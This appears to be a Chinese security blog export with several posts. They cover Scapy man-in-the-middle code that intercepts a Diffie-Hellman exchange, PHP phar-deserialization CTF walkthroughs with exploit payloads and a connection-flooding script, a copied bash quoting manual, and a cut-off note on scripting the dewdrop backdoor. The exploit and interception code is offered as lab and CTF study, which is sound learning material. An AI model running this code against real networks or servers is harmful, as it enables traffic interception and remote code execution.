newdata.encode() print(&quot;\\tdata:&#123;&#125;\\n\\tnewdata:&#123;&#125;&quot;.format(data.decode(), newdata.decode())) # length = pkt[IP].len - len(data) + len(newdata) newpkt = pkt del(newpkt[IP].len) del(newpkt[TCP].payload) sendp(newpkt/newdata) else: sendp(pkt) elif pkt[IP].src == IP_Server2 and pkt[IP].dst == IP_A: pkt.src = MAC_M pkt.dst = MAC_A del pkt[IP].chksum del pkt[TCP].chksum sendp(pkt)f = &#x27;tcp and (ether src &#123;&#125; or ether src &#123;&#125;)&#x27;.format(MAC_A, MAC_B)pkt = sniff(filter=f, prn=spoof_pkt) 但是修改报文只能在修改前后长度相同的情况下才能成功。原因希腊奶。 三、DH密钥交换中间人攻击这是第十次攻防实践的内容，但也是中间人攻击 然而我感觉好复杂啊 本次实验不建议参考本博客。因为seedubuntu太拉垮，装高版本python3和pycryptodome时会出现各种问题。很难跑通。 3.1 简单设计协议关于DH密钥交换可以参考密钥交换算法-廖雪峰的官方网站 就整了个极其拉垮的： 12345678910111213141516171819202122232425262728293031323334353637383940414243 DH handshake request+--------------------+----------+----------+| magic(&#x27;DH&#x27;) | ver | type |+-------------------------------+----------+| len-p |+--------------------+---------------------+| p || |+------------------------------------------+| g || |+------------------------------------------+| A || |+------------------------------------------+其中p、g、A为可变长度，长度为len-p DH handshake reply+--------------------+----------+----------+| magic(DH) | ver | type |+-------------------------------+----------+| len-B |+--------------------+---------------------+| B || |+------------------------------------------+其中B为可变长度，长度为len-B DH send data+--------------------+----------+----------+| magic(DH) | ver | type |+-------------------------------+----------+| data || |+------------------------------------------+其中data为可变长度type字段：&#x27;\\x01&#x27;: HANDSHAKE_REQUEST&#x27;\\x02&#x27;: HANDSHAKE_REPLY&#x27;\\x03&#x27;: SEND_DATA 3.2 client 与 server 代码关于数学方面的代码完全从 yydslz 那里copy过来的 DH_key.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import randomimport timeBLOCK_SIZE = 16def power(x, y, p): res = 1 x = x % p while (y &gt; 0): if (y &amp; 1): res = (res * x) % p y = y&gt;&gt;1 x = (x * x) % p return resdef miillerTest(d, n): a = 2 + random.randint(1, n - 4) x = power(a, d, n) if (x == 1 or x == n - 1): return True while (d != n - 1): x = (x * x) % n d *= 2 if (x == 1): return False if (x == n - 1): return True return Falsedef isPrime(n, k): if (n &lt;= 1 or n == 4): return False if (n &lt;= 3): return True d = n - 1 while (d % 2 == 0): d //= 2 for i in range(k): if (miillerTest(d, n) == False): return False return Truedef EX_GCD(a, b, arr): if b == 0: arr[0] = 1 arr[1] = 0 return a g = EX_GCD(b, a % b, arr) t = arr[0] arr[0] = arr[1] arr[1] = t - int(a // b) * arr[1] return gdef inverse_mod(a, n): arr = [0,1,] gcd = EX_GCD(a,n,arr) if gcd == 1: return (arr[0] % n + n) % n else: return -1def genNbitsPrime(n): index = n num = 0 for i in range(index): num = num * 2 + random.randint(0, 1) while num%2 == 0 or isPrime(num, 10) == False: num = num + 1 return numdef Primitiveroot(p): k=(p-1) // 2 for i in range(2, p-1): if pow(i, k, p)!=1: return i DH.py (协议相关代码) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183from enum import Enumimport socketimport structfrom Crypto.Cipher import AESfrom Crypto.Util.number import *import DH_keyMAGIC = b&#x27;DH&#x27;VERSION = b&#x27;\\x01&#x27;DEFAULT_BUFFER_SIZE = 1024DEFAULT_KEY_BIT_LENGTH = 8*16class DHType(Enum): HANDSHAKE_REQUEST = b&#x27;\\x01&#x27; HANDSHAKE_REPLY = b&#x27;\\x02&#x27; SEND_DATA = b&#x27;\\x03&#x27;class DHProto: def AES_encrypt(self, message, key): key = long_to_bytes(key) obj = AES.new(key, AES.MODE_ECB) message = message.ljust(16, b&#x27;\\x00&#x27;) ciphertext = obj.encrypt(message) return ciphertext def AES_decrypt(self, ciper, key): key = long_to_bytes(key) obj = AES.new(key, AES.MODE_ECB) message = obj.decrypt(ciper) return message.rstrip(b&#x27;\\x00&#x27;) def pack_data(self, message, key): DH_type = DHType.SEND_DATA.value header = struct.pack(&#x27;&gt;2sss&#x27;, MAGIC, VERSION, DH_type) data = self.AES_encrypt(message, key) return header + data def unpack_data(self, data, key): magic, ver, DH_type = struct.unpack(&#x27;&gt;2sss&#x27;, data[:4]) if magic != MAGIC or ver != VERSION or DH_type != DHType.SEND_DATA.value: return b&#x27;&#x27; message = self.AES_decrypt(data[4:], key) return message def is_send_data(self, pkt_data): if len(pkt_data) &gt; 4 and pkt_data[:2] == MAGIC and pkt_data[2:3] == VERSION and pkt_data[3:4] == DHType.SEND_DATA.value: return True return False def is_handshake_request(self, pkt_data): if len(pkt_data) &gt; 4 and pkt_data[:2] == MAGIC and pkt_data[2:3] == VERSION and pkt_data[3:4] == DHType.HANDSHAKE_REQUEST.value: return True return False def is_handshake_reply(self, pkt_data): if len(pkt_data) &gt; 4 and pkt_data[:2] == MAGIC and pkt_data[2:3] == VERSION and pkt_data[3:4] == DHType.HANDSHAKE_REPLY.value: return True return False def has_key(self): return hasattr(self, &quot;key&quot;)class DHClient(DHProto): def __init__(self, target_ip_addr=None, target_port=None, buffer_size=DEFAULT_BUFFER_SIZE): self.ip_addr = target_ip_addr self.port = target_port self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) self._buffer_size = buffer_size def set_target(self, target_ip_addr, target_port): self.ip_addr = target_ip_addr self.port = target_port def _gen_handshake_request(self, key_bit_len=DEFAULT_KEY_BIT_LENGTH): DH_type = DHType.HANDSHAKE_REQUEST.value self._p = DH_key.genNbitsPrime(key_bit_len) self._g = DH_key.Primitiveroot(self._p) self._privite_key = DH_key.genNbitsPrime(key_bit_len) self._A = pow(self._g, self._privite_key, self._p) key_len = (key_bit_len + 7) // 8 p = self._p.to_bytes(key_len, byteorder=&#x27;big&#x27;) g = self._g.to_bytes(key_len, byteorder=&#x27;big&#x27;) A = self._A.to_bytes(key_len, byteorder=&#x27;big&#x27;) header = struct.pack(&#x27;&gt;2sssI&#x27;, MAGIC, VERSION, DH_type, key_len) return header + p + g + A def _handle_handshake_reply(self, pkt_data): magic, ver, DH_type, key_len = struct.unpack(&#x27;&gt;2sssI&#x27;, pkt_data[:8]) if magic != MAGIC or ver != VERSION or DH_type != DHType.HANDSHAKE_REPLY.value: return B = int.from_bytes(pkt_data[8:], byteorder=&#x27;big&#x27;) self.key = pow(B, self._privite_key, self._p) print(&quot;Client key: &quot; + str(self.key)) def hand_shake(self): data = self._gen_handshake_request() self._socket.sendto(data, (self.ip_addr, self.port)) data, addr = self._socket.recvfrom(self._buffer_size) self._handle_handshake_reply(data) def send(self, message): pkt_data = self.pack_data(message.encode(&#x27;utf8&#x27;), self.key) self._socket.sendto(pkt_data, (self.ip_addr, self.port)) return def recv(self): pkt_data, addr = self._socket.recvfrom(self._buffer_size) if not self.is_send_data(pkt_data): return &#x27;&#x27; message = self.unpack_data(pkt_data, self.key).decode(&#x27;utf8&#x27;) return messageclass DHServer(DHProto): def __init__(self, ip_addr=&quot;127.0.0.1&quot;, port=8000, buffer_size=DEFAULT_BUFFER_SIZE): self.ip_addr = ip_addr self.port = port self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) self._socket.bind((ip_addr, port)) self._buffer_size = buffer_size def _handle_handshake_request(self, pkt_data): magic, ver, DH_type, key_len = struct.unpack(&#x27;&gt;2sssI&#x27;, pkt_data[:8]) if magic != MAGIC or ver != VERSION or DH_type != DHType.HANDSHAKE_REQUEST.value: return p, g, A = [int.from_bytes(pkt_data[8 + key_len * i: 8 + key_len * (i + 1)], byteorder=&#x27;big&#x27;) for i in range(3)] self._p = p self._g = g self._A = A self._privite_key = DH_key.genNbitsPrime(key_len) self.key = pow(A, self._privite_key, p) self._B = pow(g, self._privite_key, p) print(&quot;Server key: &quot; + str(self.key)) return def _gen_handshake_reply(self): DH_type = DHType.HANDSHAKE_REPLY.value if not hasattr(self, &quot;_B&quot;): return b&#x27;&#x27; key_bit_len = self._B.bit_length() key_len = (key_bit_len + 7) // 8 B = self._B.to_bytes(key_len, byteorder=&#x27;big&#x27;) header = struct.pack(&#x27;&gt;2sssI&#x27;, MAGIC, VERSION, DH_type, key_len) return header + B def hand_shake(self, data, addr): if not self.is_handshake_request(data): return False self._handle_handshake_request(data) data = self._gen_handshake_reply() self._socket.sendto(data, addr) return True def send(self, message, addr): pkt_data = self.pack_data(message.encode(&#x27;utf8&#x27;), self.key) self._socket.sendto(pkt_data, addr) return def recv(self): pkt_data, addr = self._socket.recvfrom(self._buffer_size) if not self.is_send_data(pkt_data): return &#x27;&#x27; message = self.unpack_data(pkt_data, self.key).decode(&#x27;utf8&#x27;) return message, addr def recv_data(self, message): pkt_data, addr = self._socket.recvfrom(self._buffer_size) print(pkt_data, addr) recv_message = self.unpack_data(pkt_data, self.key).decode(&#x27;utf8&#x27;) print(recv_message, addr) pkt_data = self.pack_data(message.encode(&#x27;utf8&#x27;), self.key) self._socket.sendto(pkt_data, addr) def run(self): data, addr = self._socket.recvfrom(self._buffer_size) if self.hand_shake(data, addr): while True: m, addr2 = self.recv() print(m) if m == &#x27;&#x27; or addr2 != addr: break self.send(&#x27;U201911711&#x27;, addr) server.py 1234from DH import DHServerserver = DHServer()server.run() client.py 1234567from DH import DHClientclient = DHClient(&quot;127.0.0.1&quot;, 8000)client.hand_shake()client.send(&#x27;test&#x27;)m = client.recv()print(m) 3.3 中间人攻击1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798from time import sleepfrom scapy.all import *from DH import DHServer, DHClient# Machine A&#x27;s informatonIP_A = &quot;192.168.25.130&quot;MAC_A = &quot;00:0c:29:29:08:c5&quot;# Machine B&#x27;s informaton# treat Gateway as Machine BIP_B = &quot;192.168.25.51&quot;MAC_B = &quot;00:0c:29:61:8e:be&quot;# Server2&#x27;s informationIP_Server2 = &quot;192.168.25.51&quot;MAC_Server2 = &quot;00:0c:29:61:8e:be&quot;# Attacker Machine&#x27;s informatonIP_M = &quot;192.168.25.128&quot;MAC_M = &quot;00:0c:29:47:b2:ee&quot;def spoof_pkt(pkt): global lserver global lclient if pkt.haslayer(IP): if pkt[IP].src == IP_A and pkt[IP].dst == IP_Server2 and hasattr(pkt[UDP], &quot;payload&quot;): newpkt = pkt del newpkt[IP].chksum del newpkt[UDP].chksum data = newpkt[UDP].payload.load if lserver.is_handshake_request(data): newpkt2 = newpkt newpkt2.src = MAC_M newpkt2.dst = MAC_Server2 del newpkt2[UDP].payload data_to_server = lclient._gen_handshake_request() newpkt2 = newpkt2 / data_to_server sendp(newpkt2) print(&quot;send handshake request to server&quot;) lserver._handle_handshake_request(data) data_to_A = lserver._gen_handshake_reply() newpkt.src = MAC_M newpkt.dst = MAC_A newpkt[IP].src = IP_Server2 newpkt[IP].dst = IP_A newpkt[UDP].sport, newpkt[UDP].dport = newpkt[UDP].dport, newpkt[UDP].sport del newpkt[UDP].payload del newpkt[IP].len del newpkt[UDP].len newpkt = newpkt / data_to_A sendp(newpkt) print(&quot;receive handshake request from A and reply&quot;) elif lserver.is_send_data(data) and lserver.has_key(): msg = lserver.unpack_data(data, lserver.key) print(&quot;mag: &quot;, msg) for i in range(10): if lclient.has_key(): break sleep(0.1) if not lclient.has_key(): print(&quot;local client doesn&#x27;t have secret key?&quot;) return pkt_data = lclient.pack_data(msg, lclient.key) newpkt.src = MAC_M newpkt.dst = MAC_Server2 del newpkt[UDP].payload newpkt = newpkt / pkt_data sendp(newpkt) print(&quot;send data to server&quot;) elif pkt[IP].src == IP_Server2 and pkt[IP].dst == IP_A and hasattr(pkt[UDP], &quot;payload&quot;): newpkt = pkt del newpkt[IP].chksum del newpkt[UDP].chksum data = newpkt[UDP].payload.load if lclient.is_handshake_reply(data): lclient._handle_handshake_reply(data) print(&quot;local client gets secret key&quot;) elif lclient.is_send_data(data): newpkt.src = MAC_M newpkt.dst = MAC_A msg = lclient.unpack_data(data, lclient.key) print(&quot;mag: &quot;, msg) pkt_data = lserver.pack_data(msg, lserver.key) del newpkt[UDP].payload newpkt = newpkt / pkt_data sendp(newpkt) print(&quot;reply data&quot;)if __name__ == &#x27;__main__&#x27;: lserver = DHServer() lclient = DHClient() f = &#x27;udp and (ether src &#123;&#125; or ether src &#123;&#125; )&#x27;.format(MAC_A, MAC_B) pkt = sniff(filter=f, prn=spoof_pkt)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"嗅探","slug":"嗅探","permalink":"http://example.com/tags/%E5%97%85%E6%8E%A2/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"}],"author":"saying"},{"title":"PHP stream wrapper","slug":"PHP_stream_wrapper","date":"2021-01-26T07:30:11.000Z","updated":"2021-06-06T06:34:10.270Z","comments":true,"path":"2021/01/26/PHP_stream_wrapper/","link":"","permalink":"http://example.com/2021/01/26/PHP_stream_wrapper/","excerpt":"","text":"PHP stream wrapper机制相关题目的分析整理一、流和包装器简介**流(stream)**是在PHP 4.3.0中引入的，作为一种通用文件、网络、数据压缩和其他操作的方式，这些操作共享一组共同的函数和用途。在其最简单的定义中，流是一种表现出流行为的资源对象。 每一种流都实现了一个**包装器(wrapper)**，包装器包含一些额外的代码用来处理特殊的协议和编码。PHP提供了一些内置的包装器。 引用流的格式如下： 1&lt;scheme&gt;://&lt;target&gt; 其中，&lt;schema&gt;为包装器的名称，如file，http，https，ftp，compress.zlib，php等。可以用stream_get_wrappers()函数查看内置的所有包装器。 12345678910111213141516171819202122array(10) &#123; [0]=&gt; string(5) &quot;https&quot; [1]=&gt; string(4) &quot;ftps&quot; [2]=&gt; string(13) &quot;compress.zlib&quot; [3]=&gt; string(3) &quot;php&quot; [4]=&gt; string(4) &quot;file&quot; [5]=&gt; string(4) &quot;glob&quot; [6]=&gt; string(4) &quot;data&quot; [7]=&gt; string(4) &quot;http&quot; [8]=&gt; string(3) &quot;ftp&quot; [9]=&gt; string(4) &quot;phar&quot;&#125; &lt;target&gt;取决于所使用的包装器。如对于文件系统相关的流&lt;target&gt;通常是所需文件的文件路径和文件名；对于网络相关的流，&lt;target&gt;通常是目标的主机名和路径。 例如，可以使用file_get_contents()打开多种数据流。 123456789&lt;?phpvar_dump(file_get_contents(&#x27;/etc/passwd&#x27;));//打开本地文件var_dump(file_get_contents(&#x27;http://www.baidu.com&#x27;));//访问网络页面var_dump(file_get_contents(&#x27;data:test/plain,coooool!&#x27;));//打开data url 二、Phar反序列化在2018年的Black Hat大会上，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it，指出通过phar://协议对一个phar文件进行操作，可能导致触发反序列化漏洞。 PHAR(PHp ARchive)是php中的打包文件，类似于java语言的jar打包文件。 可以看到倒数第二行，Meta-data以序列化格式存储。因此php的文件系统函数在通过phar://协议解析phar时，也需要对meta-data进行反序列化。因此可能触发反序列化漏洞。 受影响函数列表： 一些绕过方法 绕过文件格式的匹配：在文件头加上GIF89a 123456789101112&lt;?class test&#123; public $name = &#x27;xxx&#x27;;&#125;$o = new test();$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub开头为GIF89a$phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); 编码绕过、大小写绕过等 123$file = &quot;PhAr://&quot; . __DIR__ . &#x27;/phar.phar&#x27;;$file = &quot;\\x70har\\x3a//&quot; . __DIR__ . &#x27;/phar.phar&#x27;;$file = &#x27;php://filter/read=convert.base64-encode/resource=phar://&#x27; . __DIR__ . &#x27;/phar.phar&#x27;; 三、题目（1）HITCON 2016 babytrick这个似乎与stream或wrapper无关，只是顺带 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&lt;?phpinclude &quot;config.php&quot;;class HITCON&#123; private $method; private $args; private $conn; public function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;__conn(); &#125; function show() &#123; list($username) = func_get_args(); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27;&quot;, $username); $obj = $this-&gt;__query($sql); if ( $obj != false ) &#123; $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) ); &#125; else &#123; $this-&gt;__die(&quot;Nobody Nobody But You!&quot;); &#125; &#125; function login() &#123; global $FLAG; list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;, $username, $password); if ( $username == &#x27;orange&#x27; || stripos($sql, &#x27;orange&#x27;) != false ) &#123; $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;); &#125; $obj = $this-&gt;__query($sql); if ( $obj != false &amp;&amp; $obj-&gt;role == &#x27;admin&#x27; ) &#123; $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG); &#125; else &#123; $this-&gt;__die(&quot;Admin only!&quot;); &#125; &#125; function source() &#123; highlight_file(__FILE__); &#125; function __conn() &#123; global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-&gt;conn) $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-&gt;conn); if ($DEBUG) &#123; $sql = &quot;CREATE TABLE IF NOT EXISTS users ( username VARCHAR(64), password VARCHAR(64), role VARCHAR(64) ) CHARACTER SET utf8&quot;; $this-&gt;__query($sql, $back=false); $sql = &quot;INSERT INTO users VALUES (&#x27;orange&#x27;, &#x27;$db_pass&#x27;, &#x27;admin&#x27;), (&#x27;phddaa&#x27;, &#x27;ddaa&#x27;, &#x27;user&#x27;)&quot;; $this-&gt;__query($sql, $back=false); &#125; mysql_query(&quot;SET names utf8&quot;); mysql_query(&quot;SET sql_mode = &#x27;strict_all_tables&#x27;&quot;); &#125; function __query($sql, $back=true) &#123; $result = @mysql_query($sql); if ($back) &#123; return @mysql_fetch_object($result); &#125; &#125; function __die($msg) &#123; $this-&gt;__close(); header(&quot;Content-Type: application/json&quot;); die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) ); &#125; function __close() &#123; mysql_close($this-&gt;conn); &#125; function __destruct() &#123; $this-&gt;__conn(); if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) &#123; @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; else &#123; $this-&gt;__die(&quot;What do you do?&quot;); &#125; $this-&gt;__close(); &#125; function __wakeup() &#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); &#125; &#125;&#125;if(isset($_GET[&quot;data&quot;])) &#123; @unserialize($_GET[&quot;data&quot;]); &#125; else &#123; new HITCON(&quot;source&quot;, array());&#125; 一道正常的反序列化题目，只有一个HITCON。观察代码可以发现，析构函数会将类的属性args作为参数，执行以属性method为名的方法。而在login()中可以找到输出flag。所以关键在于，登陆时需要以orange账号登录。 然而orange账号的密码是未知的。这里会注意到show()方法。可以利用show()方法在SQL查询时进行SQL注入，查询到账户orange的密码。仅需绕过__wakeup()魔术方法。利用CVE-2016-7124，序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup()的执行，从而使传入的args参数无需经过mysql_escape_string()函数，直接地在login()方法中实现SQL注入。爆出密码。 获得密码后即可用于login()，但是这里仍有限制： 123if ( $username == &#x27;orange&#x27; || stripos($sql, &#x27;orange&#x27;) != false ) &#123; $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);&#125; 用户名不能为’orange’，sql语句中不能包含’orange’。 以下内容来自MySql手册： 12345678910使用utf8_general_ci和utf8_unicode_ci两种 校对规则下面的比较相等： Ä = A Ö = O Ü = U两种校对规则之间的区别是，对于utf8_general_ci下面的等式成立： ß = s但是，对于utf8_unicode_ci下面等式成立： ß = ss 因此，username=ORÄNGE时，可以绕过上面的php检测，而sql语句却依然能正常执行。orange账号成功登录，即可得到flag。 （2）HITCON 20171234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php $FLAG = create_function(&quot;&quot;, &#x27;die(`/read_flag`);&#x27;); $SECRET = `/read_secret`; $SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($SANDBOX); @chdir($SANDBOX); if (!isset($_COOKIE[&quot;session-data&quot;])) &#123; $data = serialize(new User($SANDBOX)); $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET); setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac)); &#125; class User &#123; public $avatar; function __construct($path) &#123; $this-&gt;avatar = $path; &#125; &#125; class Admin extends User &#123; function __destruct()&#123; $random = bin2hex(openssl_random_pseudo_bytes(32)); eval(&quot;function my_function_$random() &#123;&quot; .&quot; global \\$FLAG; \\$FLAG();&quot; .&quot;&#125;&quot;); $_GET[&quot;lucky&quot;](); &#125; &#125; function check_session() &#123; global $SECRET; $data = $_COOKIE[&quot;session-data&quot;]; list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) die(&quot;Bye&quot;); if ( !hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac) ) die(&quot;Bye Bye&quot;); $data = unserialize($data); if ( !isset($data-&gt;avatar) ) die(&quot;Bye Bye Bye&quot;); return $data-&gt;avatar; &#125; function upload($path) &#123; $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); if (substr($data, 0, 6) !== &quot;GIF89a&quot;) die(&quot;Fuck off&quot;); file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;); &#125; function show($path) &#123; if ( !file_exists($path . &quot;/avatar.gif&quot;) ) $path = &quot;/var/www/html&quot;; header(&quot;Content-Type: image/gif&quot;); die(file_get_contents($path . &quot;/avatar.gif&quot;)); &#125; $mode = $_GET[&quot;m&quot;]; if ($mode == &quot;upload&quot;) upload(check_session()); else if ($mode == &quot;show&quot;) show(check_session()); else highlight_file(__FILE__); 可以看到源码中利用create_function()构造了一个匿名函数，直接输出flag。那么重点就在于执行这个匿名函数。类Admin的析构函数中可以执行任意函数，包括在该析构函数中使用eval定义的一个函数。然而该匿名函数的函数名中含有随机字符串，爆破是不可能爆破的，这辈子都不可能。 匿名函数并非没有名字，而是以%00lambda_%d命名，其中%d为数字，表示进程的第%d个匿名函数。可以通过发送大量请求迫使apache服务器开启一个新的进程，这样%d将重置为1。 因此，现在最重要的问题就是如果反序列化调用Admin类的析构函数。很容易找到checksession()中调用了unserialize()函数，但可惜的是这个反序列化函数无法利用，因为伪造cookie，直接修改session-data，会导致hash_equal()验证失败。 但是可以利用phar反序列化。 123456789101112131415&lt;?php class Admin &#123; public $avatar = &#x27;xxx&#x27;;&#125;@unlink(&quot;avatar.phar&quot;);$phar = new Phar(&quot;avatar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();rename(__DIR__ . &#x27;/avatar.phar&#x27;, __DIR__ . &#x27;/avatar.jpg&#x27;);?&gt; 把生成的avatar.jpg放到vps上传。随后只需要通过file_get_contents()，file_put_contents()，或file_exists()之类的文件相关函数，使用phar://这个stream wrapper打开文件。在题目中需要再次利用upload()函数。 1?m=upload&amp;url=phar:///var/www/data/xxx&amp;lucky=%00lambda_1 官方wp有一个fork脚本，用于迫使apache开启新的进程 123456789101112131415161718192021222324252627# coding: UTF-8# Author: orange@chroot.org# import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = &#x27;xxxxx&#x27; PORT = 80 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(&#x27;GET / HTTP/1.1\\nHost: xxxxx\\nConnection: Keep-Alive\\n\\n&#x27;) # s.close() print &#x27;ok&#x27; time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).get(0xffff) （3）HITCON 2018（4）hxp ctf 2020 resonator题目源码： 12345&lt;?php$file = $_GET[&#x27;file&#x27;] ?? &#x27;/tmp/file&#x27;;$data = $_GET[&#x27;data&#x27;] ?? &#x27;:)&#x27;;file_put_contents($file, $data);echo file_get_contents($file); 参考链接1、Phar File Format 2、Phar与Stream Wrapper造成PHP RCE的深入挖掘 3、利用 phar 拓展 php 反序列化漏洞攻击面 4、My-CTF-Web-Challenges 5、Mysql中的排序规则utf8_unicode_ci、utf8_general_ci的区别总结","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"bash下的转义","slug":"bash下的转义","date":"2020-12-12T07:34:47.000Z","updated":"2021-06-06T06:10:22.601Z","comments":true,"path":"2020/12/12/bash下的转义/","link":"","permalink":"http://example.com/2020/12/12/bash%E4%B8%8B%E7%9A%84%E8%BD%AC%E4%B9%89/","excerpt":"bash下的转义bash手册如下:没错这篇博客是纯copy手册","text":"bash下的转义bash手册如下:没错这篇博客是纯copy手册 123456789101112131415161718192021222324252627282930313233343536373839404142Quoting: Quoting is used to remove the special meaning of certain characters or words to the shell. Quoting can be used to disable special treatment for special characters, to prevent reserved words from being recognized as such, and to prevent parameter expansion. Each of the metacharacters listed above under DEFINITIONS has special meaning to the shell and must be quoted if it is to represent itself. When the command history expansion facilities are being used (see HISTORY EXPANSION below), the history expansion character, usually !, must be quoted to prevent history expansion. There are three quoting mechanisms: the escape character, single quotes, and double quotes. A non-quoted backslash (\\) is the escape character. It preserves the literal value of the next character that follows, with the exception of &lt;newline&gt;. If a \\&lt;newline&gt; pair appears, and the backslash is not itself quoted, the \\&lt;newline&gt; is treated as a line continuation (that is, it is removed from the input stream and effectively ignored). Enclosing characters in single quotes preserves the literal value of each character within the quotes. A single quote may not occur between single quotes, even when preceded by a backslash. Enclosing characters in double quotes preserves the literal value of all characters within the quotes, with the exception of $, `, \\, and, when history expansion is enabled, !. When the shell is in posix mode, the ! has no special meaning within double quotes, even when history expansion is enabled. The characters $ and ` retain their special meaning within double quotes. The backslash retains its special meaning only when followed by one of the following characters: $, `, &quot;, \\, or &lt;newline&gt;. A double quote may be quoted within double quotes by preceding it with a backslash. If enabled, history expansion will be performed unless an ! appearing in double quotes is escaped using a backslash. The backslash preceding the ! is not removed. The special parameters * and @ have special meaning when in double quotes (see PARAMETERS below). Words of the form $&#x27;string&#x27; are treated specially. The word expands to string, with backslash-escaped characters replaced as specified by the ANSI C standard. Backslash escape sequences, if present, are decoded as follows: \\a alert (bell) \\b backspace \\e \\E an escape character \\f form feed \\n new line \\r carriage return \\t horizontal tab \\v vertical tab \\\\ backslash \\&#x27; single quote \\&quot; double quote \\? question mark \\nnn the eight-bit character whose value is the octal value nnn (one to three digits) \\xHH the eight-bit character whose value is the hexadecimal value HH (one or two hex digits) \\uHHHH the Unicode (ISO/IEC 10646) character whose value is the hexadecimal value HHHH (one to four hex digits) \\UHHHHHHHH the Unicode (ISO/IEC 10646) character whose value is the hexadecimal value HHHHHHHH (one to eight hex digits) \\cx a control-x character The expanded result is single-quoted, as if the dollar sign had not been present. A double-quoted string preceded by a dollar sign ($&quot;string&quot;) will cause the string to be translated according to the current locale. If the current locale is C or POSIX, the dollar sign is ignored. If the string is translated and replaced, the replacement is double-quoted. 使用echo测试时，zsh和bash略有不同。zsh的echo相当于bash的echo -e。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}],"author":"saying"},{"title":"重复执行程序脚本","slug":"重复执行程序脚本","date":"2020-09-08T11:13:29.000Z","updated":"2021-06-06T06:30:33.573Z","comments":true,"path":"2020/09/08/重复执行程序脚本/","link":"","permalink":"http://example.com/2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/","excerpt":"","text":"在项目组工作的过程中，遇到了一个任务：需要重复执行某程序，生成大量的流量。抓取流量，用于AI的学习。因此需要写脚本不断执行程序。我选择了python语言。 一、（1）dewdropdewdrop是一款linux后门软件。在靶机上运行dewdrop服务器后，就可以在攻击机上运行dewdrop客户端连接上靶机，实现远程控制。 我选择subprocess模块。subprocess模块允许启动一个新进程，并将它连接到标准输入/标准输出/标准错误管道。 1234567891011121314151617181920212223242526import sysimport timeimport subprocessfrom random import choiceif __name__==&quot;__main__&quot;: #check for args, print usage if incorrect if len(sys.argv) != 6: print(&#x27;\\nUsage:\\nrundewdrop.py [victim ip] [victim port] &#x27; &#x27;[Listener ip] [Listener port] [Number of command]\\n&#x27;) sys.exit() dip = sys.argv[1] dport = int(sys.argv[2]) listener_ip = sys.argv[3] listener_port = int(sys.argv[4]) command_number = int(sys.argv[5]) run_command = &#x27;./tipoff -i 